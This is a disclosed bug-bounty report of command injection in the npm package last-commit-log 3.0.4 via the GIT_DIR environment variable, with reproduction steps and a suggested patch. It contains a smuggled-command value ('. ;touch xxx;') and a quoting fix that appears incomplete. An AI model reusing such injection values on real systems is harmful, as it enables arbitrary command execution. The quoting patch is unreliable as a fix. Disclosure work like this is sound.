# [last-commit-log] Command Injection

## Report Details
- **Report ID**: 881713
- **URL**: https://hackerone.com/reports/881713
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-05-24T11:57:12.726Z
- **Disclosed**: 2020-11-29T11:06:29.469Z

## Reporter
- **Username**: bilk0h
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report `Command Injection` in `last-commit-log`
It allows `execution of arbitrary commands`

# Module

**module name:** `last-commit-log`
**version:** `last-commit-log@3.0.4`
**npm page:** `https://www.npmjs.com/package/last-commit-log`

## Module Description

Node.js module to get the last git commit information - mostly to be used by CI/CD and building phase.

## Module Stats

[3,253] downloads in the last week

# Vulnerability

The value of the GIT_DIR env variable is added to the command here on [line 10](https://github.com/node-modules/last-commit-log/blob/master/index.js#L10) and here on [line 25](https://github.com/node-modules/last-commit-log/blob/master/index.js#L25) and finally the command is executed on [line 36](https://github.com/node-modules/last-commit-log/blob/master/index.js#L36).

## Vulnerability Description

## Steps To Reproduce:
> npm i last-commit-log
>cat > test.js
const LCL = require('last-commit-log');
const lcl = new LCL('.'); // or `new LCL(dir)` dir is process.cwd() by default
>lcl
  .getLastCommit()
  .then(commit => console.log(commit));

Export malicious GIT_DIR string
>export GIT_DIR=". ;touch xxx;"

Run
>node test.js


{F840963}

## Patch

Fix: enclose --git-dir flag in quotes on line 10 like so
```this.gitDirStr = GIT_DIR ? `--git-dir="${GIT_DIR}/.git"` : '';```

## Supporting Material/References:

- [OPERATING SYSTEM VERSION] Ubuntu 18.04.4 LTS
- [NODEJS VERSION] v14.0.0
- [NPM VERSION] 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [Y/N] No
- I opened an issue in the related repository: [Y/N] No

## Impact

Ability to run any command available for attacker.

## Attachments
- last-commit-log-demo.gif
